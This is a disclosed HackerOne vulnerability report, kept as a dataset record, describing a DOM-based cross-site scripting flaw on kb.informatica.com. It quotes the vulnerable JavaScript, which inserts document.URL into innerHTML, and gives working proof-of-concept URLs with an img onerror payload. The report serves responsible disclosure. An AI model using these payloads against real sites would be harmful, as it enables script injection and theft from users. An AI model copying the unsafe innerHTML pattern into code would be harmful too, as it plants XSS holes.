---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '156166'
original_report_id: '156166'
title: '[kb.informatica.com] Dom Based xss'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: informatica
created_at: '2016-08-02T20:04:02.673Z'
disclosed_at: '2019-08-17T09:48:13.150Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 22
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# [kb.informatica.com] Dom Based xss

## Metadata

- HackerOne Report ID: 156166
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: informatica
- Disclosed At: 2019-08-17T09:48:13.150Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi! I found Dom based xss on this subdomain https://kb.informatica.com
javaScript security is very important, even more in portals where users store their personal data. 
Attackers can target those portals to find and exploit High-risk JavaScript vulnerabilities like Dom based xss vulnerabilities

POC ,the vulnerable code javascript on this page https://kb.informatica.com/KBExternal/pages/infasearchltd.aspx?
view-source: string 1406 /*google chrome

var li = document.createElement("li");
strChild = "<a href="+document.URL+" style='color:#fff !important;font-size:10px'>Search Results</a>";
li.innerHTML = strChild; document.getElementById('DynamicBreadcrumb').appendChild(li);
} 

attack scenario the latest versions of browsers
google chrome https://kb.informatica.com/KBExternal/pages/infasearchltd.aspx?#"><img src=x onerror=alert(document.domain)>&infasearch.aspx=hek
IE 11  https://kb.informatica.com/KBExternal/pages/infasearchltd.aspx?#"><img src=x onerror=alert(document.domain)>&infasearch.aspx=hek

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
